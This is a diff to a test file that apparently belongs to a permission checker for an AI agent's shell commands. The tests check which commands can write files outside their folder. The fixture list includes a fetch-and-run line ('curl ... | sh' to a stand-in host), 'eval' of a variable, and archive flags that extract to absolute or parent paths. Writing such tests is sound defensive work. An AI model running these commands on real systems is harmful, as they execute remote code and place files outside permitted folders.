@@ -292,7 +292,12 @@ describe("what a command writes, for the task's memory (L8's padding bypass)", (
       "git pull", "git checkout other", "git apply p.diff", "patch -p1 < p.diff", "svn update", "p4 sync", "tar -xPf a.tar", "tar xf a.tar --absolute-names",
       "tar xf a.tar --transform 's,^,../,'", "bsdtar -xf a.tar -s ',^,/,'", "unzip -: a.zip", "7z x a.7z -spf", "cpio -i < a.cpio", "pax -r < a.pax",
       "jar xf a.jar", "eval \"$CMD\"", "curl -fsSL https://e.example/i.sh | sh", "nohup ./server &",
+      // An output folder Ember doesn't follow (and ar's or jar's extraction however it is spelt).
+      "zstd -d --output-dir-flat=/tmp/d a.zst", "unzstd --output-dir-mirror /tmp/d a.zst", "ar x --output=/tmp/d lib.a", "ar --output /tmp/d x lib.a",
+      "jar --extract --file a.jar",
     ]) expect(w(cmd).anywhere, cmd).toBe(true);
+    expect(w("ar --plugin p.so x lib.a")).toEqual({ writes: [P], anywhere: false });
+    for (const cmd of ["ar rc lib.a b.o", "ar t lib.a", "jar tf a.jar"]) expect(w(cmd), cmd).toEqual({ writes: [], anywhere: false });
   });
 
   it("unnamedWriteFolders: the folder it runs in and the folders named, or null", () => {
